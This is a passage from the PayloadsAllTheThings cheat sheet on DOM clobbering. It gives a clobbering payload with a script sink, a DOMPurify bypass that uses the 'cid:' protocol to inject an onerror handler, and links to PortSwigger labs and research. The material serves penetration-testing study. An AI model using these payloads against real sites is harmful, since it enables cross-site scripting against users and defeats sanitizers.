<!-- source: DOM Clobbering/README.md | chunk 2/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
    ```

## Tricks

- DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

## Labs

- [PortSwigger - Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [PortSwigger - Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [PortSwigger - DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## References

- [Bypassing CSP via DOM clobbering - Gareth Heyes - June 5, 2023](https://web.archive.org/web/20251114182213/https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM Clobbering - HackTricks - January 27, 2023](https://web.archive.org/web/20241215205040/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOM Clobbering - PortSwigger - September 25, 2020](https://web.archive.org/web/20260218083100/https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering strikes back - Gareth Heyes - February 6, 2020](https://web.archive.org/web/20200224065316/https://portswigger.net/research/dom-clobbering-strikes-back)
- [Hijacking service workers via DOM Clobbering - Gareth Heyes - November 29, 2022](https://web.archive.org/web/20260123013910/https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
